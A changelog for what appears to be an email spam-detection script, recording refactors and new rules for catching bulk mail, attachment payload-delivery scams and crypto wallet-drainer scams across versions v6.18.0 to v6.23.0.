L3/L5 review fixes — RFC2822_QUOTED_NAME constant, Rule 0→1 comments, maxAllowedEmailsPerRun/maxAllowedDaysToCheck into LIMITS, empty-domain guard on addToWhitelist/addToBlacklist, \uD835 surrogate explanation.

## v6.23.0

Extract BULK_EMAIL_FINGERPRINTS constant + isBulkEmail() helper. Fixes cleanseInbox() missing toLowerCase and test_spam_detector.py missing x-ses-.

## v6.22.0

Improve all comments for clarity at introductory CS level. Fix @version tag, rule numbering in header and docstrings, plain-English explanations for ReDoS, log injection, RFC 2822.

## v6.21.0

CS professor refactor — JSON.parse fallback on corrupt Script Properties, patterns to module-level constants, split analyzeMessage() into collectSignals()/makeVerdict(), named

LIMITS constants, boolean return type, rules renumbered 1-5, debugWhyFlagged() uses production pipeline, removed dead code.

## v6.20.0

Detect payload delivery scams — empty subject + attachment (Rule 5). Scam hides payload inside Excel/PDF; add scam_examples/ test phase.

## v6.19.0

Detect crypto airdrop/wallet-drainer scams via body patterns. Add crypto quantity pattern (\d+ $TICKER) and body-only airdrop/ connect-wallet check; each increments clickbaitCount → Rule 4.

## v6.18.0

Systemic RFC 2822 normalization fix. Normalize `from` once at top of signal collection; remove comma from marketing pattern (false positives on legit org names like "Bay Meadows, San Mateo").
